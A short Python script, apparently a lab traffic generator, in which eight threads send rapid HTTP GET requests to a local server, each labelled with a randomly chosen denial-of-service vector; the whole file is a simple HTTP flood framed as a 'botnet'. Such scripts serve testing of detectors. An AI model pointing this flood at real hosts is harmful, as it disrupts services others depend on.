import requests
import threading
import random
import time

# ================= CONFIG =================
TARGET_URL = "http://127.0.0.1:5000/"
BOT_COUNT = 8           # number of bot threads
RUN_DELAY = 0.01        # base delay between requests

ATTACK_VECTORS = [
    "HTTP_FLOOD",
    "BURST",
    "SLOWLORIS",
    "UDP_FLOOD (SIMULATED)",
    "TCP_SYN_FLOOD (SIMULATED)"
]

running = True

# ================= BOT LOGIC =================
def bot(bot_id):
    global running

    while running:
        try:
            vector = random.choice(ATTACK_VECTORS)

            requests.get(
                TARGET_URL,
                headers={
                    "X-Attack-Type": vector
                },
                timeout=0.3
            )

            # Attack pattern behavior
            if vector == "SLOWLORIS":
                time.sleep(1.0)
            elif vector == "BURST":
                time.sleep(0.05)
            else:
                time.sleep(RUN_DELAY)

        except:
            pass

# ================= START BOTNET =================
threads = []

print("🚨 Multi-Vector DoS Attack Started")

for i in range(BOT_COUNT):
    t = threading.Thread(target=bot, args=(i,), daemon=True)
    threads.append(t)
    t.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    running = False
    print("🛑 Attack Stopped")
